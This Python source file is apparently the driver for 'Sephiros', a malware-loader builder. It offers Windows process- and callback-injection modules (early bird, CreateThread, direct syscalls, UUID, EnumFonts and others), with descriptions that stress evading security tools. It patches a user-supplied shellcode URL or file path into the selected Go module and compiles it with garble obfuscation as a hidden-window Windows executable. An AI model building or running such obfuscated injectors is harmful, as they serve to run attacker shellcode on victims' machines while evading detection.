  
import os
from argparse import ArgumentParser
from subprocess import run
from subprocess import run, STDOUT
from sys import stdout
from time import sleep
import colorama
from colorama import Fore,Style
import random
import subprocess
import re
import time
import platform

black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"


# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"



colorama.init(autoreset=True)  # Initialize colorama for Windows
ans_directory = 'banners'
spec= os.path.abspath(".")
ans_files = [file for file in os.listdir(ans_directory) if file.endswith('.ans')]
if not ans_files:
    print("No .ans files found in the current directory.")
    

def display_ansi_art(file_path):
    with open(file_path, 'r', encoding='latin-1') as file:
        ansi_art = file.read()
    print(ansi_art)
random_ans_file = os.path.join(ans_directory, random.choice(ans_files))
display_ansi_art(random_ans_file)
introduction = ( 
    Fore.YELLOW + "         Those who can not remember the past are condemned to repeat it \n"
    "Version: 1.0\n"
    "Author: ELMERIKH\n" + Style.RESET_ALL
)





modules_info = {
    "earlybird.go": {
        "description": "Early bird injection is a technique that involves creating a new process and injecting code into it before the main thread starts executing. One of the key benefits of this method over normal APC Queue code injection is that the malicious behavior occurs early in the process initialization phase.",
        "path": "path/to/earlybird.go",
    },
    "createthread.go": {
        "description": "CreateThread injection involves creating a new thread in a remote process and injecting code into it. This technique is commonly used for injecting shellcode into a target process's address space.",
        "path": "path/to/createthread.go",
    },
    "NtQueueApcThreadEx-Local.go": {
        "description": "NtQueueApcThreadEx-Local is a technique that queues an Asynchronous Procedure Call (APC) to a target thread within the same process. This allows for the execution of arbitrary code in the context of the target process.",
        "path": "path/to/NtQueueApcThreadEx-Local.go",
    },
    "RtlCreteUserThread.go": {
        "description": "RtlCreateUserThread is used to create a thread in the address space of another process and execute shellcode within that process. This technique is often used for stealthy code injection.",
        "path": "path/to/RtlCreteUserThread.go",
    },
    "Syscall.go": {
        "description": "Syscall injection involves directly calling Windows API functions using syscalls, bypassing traditional API hooking mechanisms. This method can be used to execute shellcode with minimal detection by security software.",
        "path": "path/to/Syscall.go",
    },
    "Uuid.go": {
        "description": "Uuid injection involves generating a unique identifier (UUID) using the UuidCreate function and then executing shellcode within the context of a newly created thread. This technique can be used to evade detection by security tools.",
        "path": "path/to/Uuid.go",
    },
    # Add more modules as needed
}

modules_info2 = {
    "createTimerQueue.go": {
        "description": "CreateTimerQueue injection involves creating a timer queue in a target process and associating a callback function with the timer. When the timer expires, the callback function is executed, allowing the injection of shellcode into the target process.",
        "path": "path/to/createTimerQueue.go",
    },
    "enumDesktop.go": {
        "description": "EnumDesktop injection involves enumerating the desktop objects in a target process and injecting code into them. This technique can be used to execute code in the context of a specific desktop, bypassing security measures that may be in place on the default desktop.",
        "path": "path/to/enumDesktop.go",
    },
    "enumFonts.go": {
        "description": "EnumFonts injection involves enumerating the fonts installed on a target system and injecting code into the font enumeration process. This technique can be used to execute code during font enumeration operations, which may occur during application startup or when rendering text.",
        "path": "path/to/enumFonts.go",
    },
    "gray.go": {
        "description": "Gray injection is a technique that involves injecting code into the address space of a target process without creating a new thread. This method relies on asynchronous procedure calls (APCs) to execute the injected code in the context of the target process.",
        "path": "path/to/gray.go",
    },
    # Add more modules as needed
}



# Function to parse the content of the `modules` directory and return a list of file names
def parse_modules(folder):
    module_files = []
    for file in os.listdir(folder):
        if os.path.isfile(os.path.join(folder, file)):
            module_files.append(file)
    return module_files

# Function to display options
def show_options(names):
    print("Select an option:")
    for i, name in enumerate(names, 1):
        print(f"[{i}] {name}")
  

# Run shell commands in python
def shell(command, capture_output=False):
    try:
        result = run(command, shell=True, capture_output=capture_output, text=True, stderr=STDOUT)
        if capture_output:
            return result.stdout
    except Exception as e:
        # If an error occurs, print the error message
        print(f"Error occurred: {e}")

# Print lines slowly
def sprint(text, delay=0.06):
    for char in text:
        stdout.write(char)
        stdout.flush()
        sleep(delay)
    print()  

# Center text 
def center_text(text, width=80):
    lines = text.splitlines()
    centered_text = ""
    for line in lines:
        centered_text += line.center(width) + "\n"
    return centered_text

def clear(fast=False, lol=False):
    
    os.system("cls" if os.name == "nt" else "clear")
    if fast:
        display_ansi_art(random_ans_file)
        print(introduction)
    
    else:
        
        display_ansi_art(random_ans_file)
        sprint(introduction, 0.005)
        




# Polite Exit
def pexit():

    sprint(f"\n{red}    May the Force be with you !\n{nc}")
    exit(0)




# Info about tool
def about():
    clear()
    print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan} : {yellow}[{green}\Sephiros{yellow}] ")
    
 
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu      \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        return
# Main function to handle user input and execute commands
def main():
    parser = ArgumentParser()
    parser.add_argument("-o", "--option", help="Sephiros [Default : null]")
        
    args = parser.parse_args()

        
    option = args.option
    clear(lol=True)
    while True:
       
        
            print(f"\n{info}1-Thread/Process Injection ")
            print(f"\n{info}2-Callback Injection")
            choice = input(f"\n{ask}Select one of the options > {green}")
            
            if choice == "1":
                folder = "modules"
                infos =modules_info
            elif choice == "2":
                folder = "modules/callback"
                infos=modules_info2
            elif choice == "0":
                pexit()
            else:
                print("Invalid choice. Please select again.")
                continue
            try:
                des=infos
                module_files = parse_modules(folder)
                while True:
                    
                    clear(lol=True)
                    
                    show_options(module_files)
                    if option is not None:
                        choice = option
                    else:
                        choice = input(f"{ask}Select one of the options > {green}")
                    if choice != "0" and choice.startswith("0"):
                        choice = choice.replace("0", "")
                    if choice.lower() == "a":
                        about()
                    elif choice.lower() == "o":
                        print(f"\n{ask}s it is ? {green}")
                    elif choice.lower() == "s":
                        clear(lol=True)
                        break
                    elif choice == "0":
                        pexit()
                    elif choice in map(str, range(1, len(module_files) + 1)):
                        module_file = module_files[int(choice) - 1]
                        # Execute the module file
                        if module_file in des:
                            print(f"\n{info}Module Name: {module_file} ")
                            module_info = des[module_file]
                            print(f"\n{info}Description: {module_info['description']} ")
                            
                        with open(folder+"/"+module_file, 'r') as file:
                            content = file.read()
                        cho = input(f"\n {yellow}Do you want to provide a URL or a path? (url/path): {cyan}")

                        if cho.lower() == "url":
                            url=input(f"\n{ask}URL ? {green}")
                            pattern = r'shellcodePath := flag.String\("(.*?)", "(.*?)", "(.*?)"\)'

            # Replace the middle string in the line with the new value
                            content = re.sub(pattern, f'shellcodePath := flag.String("\\1", "", "\\3")', content)
                            with open(folder+"/"+module_file, 'w') as file:
                                file.write(content)
                            pattern = r'shellcodeURL := flag.String\("(.*?)", "(.*?)", "(.*?)"\)'
                            
            # Replace the middle string in the line with the new value
                            content = re.sub(pattern, f'shellcodeURL := flag.String("\\1", "{url}", "\\3")', content)

                            with open(folder+"/"+module_file, 'w') as file:
                                file.write(content)
                        
                        elif cho.lower() == "path":
                            path=input(f"\n{ask}Path to shellcode  ? {green}")
                            with open(path, 'r') as shellcode_file:
                                shellcode_content = shellcode_file.read()


                            pattern = r'shellcodeURL := flag.String\("(.*?)", "(.*?)", "(.*?)"\)'
                            
            # Replace the middle string in the line with the new value
                            content = re.sub(pattern, f'shellcodeURL := flag.String("\\1", "", "\\3")', content)
                            with open(folder+"/"+module_file, 'w') as file:
                                file.write(content)
                            pattern = r'shellcodePath := flag.String\("(.*?)", "(.*?)", "(.*?)"\)'

            # Replace the middle string in the line with the new value
                            content = re.sub(pattern, f'shellcodePath := flag.String("\\1", "{shellcode_content}", "\\3")', content)

                            with open(folder+"/"+module_file, 'w') as file:
                                file.write(content)
                        else:
                            print(f"\n{error}Invalid choice, Back to menu.")
                            time.sleep(1.5)
                            clear(lol=True)
                            break
                        subprocess.run("export GOOS=windows GOARCH=amd64", shell=True)
                        print(f"\nbuilding...{green}")
                        if platform.system().lower() != "windows":
                            run(f"garble -literals -tiny build -ldflags '-H=windowsgui' -o ./Output/Sephiros.exe {folder}/{module_file}", shell=True)
                        else:
                            run(f"""garble -literals -tiny build -ldflags "-H=windowsgui" -o ./Output/Sephiros.exe {folder}/{module_file}""", shell=True)

                        print(f"\nYour exe is in ./Output folder{bgreen}")
                        pexit()
                    else:
                        sprint(f"\n{error}Wrong input {bred}\"{choice}\"")
                        option = None
            except KeyboardInterrupt:
                pexit()
        

if __name__ == '__main__':
    main()





            